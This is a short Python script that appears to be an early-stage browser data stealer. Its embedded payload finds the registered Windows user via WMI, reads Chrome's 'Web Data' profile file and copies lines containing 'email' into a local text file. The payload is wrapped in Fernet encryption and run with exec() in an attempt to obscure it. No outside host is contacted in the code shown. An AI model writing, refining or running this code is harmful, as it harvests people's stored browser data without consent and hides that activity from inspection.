import wmi
import base64
from cryptography.fernet import Fernet

code = br"""
c = wmi.WMI()
#c = wmi.WMI("user name")
# Get user, helpful for files

# Get the first OS's user name
userName = c.Win32_OperatingSystem()[0].RegisteredUser
chromePath = fr"C:\Users\{userName}\AppData\Local\Google\Chrome\User Data\Default"

#for dir in os.listdir(chromePath):

retrievedData = open("retrievedData.txt", "w", encoding="utf8", errors="ignore")

retrievedData.write("User: " + userName + "\n\n")

#retrievedData.write("Processes: \n\n")

#for process in c.Win32_SystemProcesses():
    #retrievedData.write(process.PartComponent.Name + "\n")

with open(rf"C:\Users\{userName}\AppData\Local\Google\Chrome\User Data\Default\Web Data", "r", errors="ignore", encoding="utf8") as file:
    for line in file.readlines():
        if "email" in line:
            retrievedData.write(line)

retrievedData.close()
file.close()
#for thing in c.Win32_ComputerSystem():
    #print(thing.SystemFamily, thing.SystemSKUNumber)

#for thing in c.Win32_SystemProcesses():
    #print(thing.PartComponent.Name) -> Gets all names of each process running
"""

key = Fernet.generate_key()
f = Fernet(key)
# Try encripting in base 64, then with Fernet, then decode Fernet and base64

enc_code = Fernet.encrypt(f, code)
enc_code = Fernet.decrypt(f, enc_code)

exec(enc_code)

